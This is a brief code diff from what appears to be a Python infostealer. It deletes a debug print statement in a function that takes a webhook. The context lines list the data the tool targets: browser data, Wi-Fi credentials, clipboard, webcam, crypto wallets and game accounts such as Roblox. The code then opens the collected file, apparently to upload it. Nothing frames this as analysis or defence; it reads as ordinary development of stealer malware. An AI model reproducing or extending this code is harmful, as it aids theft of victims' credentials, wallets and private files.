@@ -78,7 +78,6 @@ def main(webhook: str):
 			data.update({"content": content})
 
 	if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
-		print(os.path.getsize(_file))
 		if os.path.getsize(_file) == 22:
 			return
 		with open(_file, 'rb') as file:
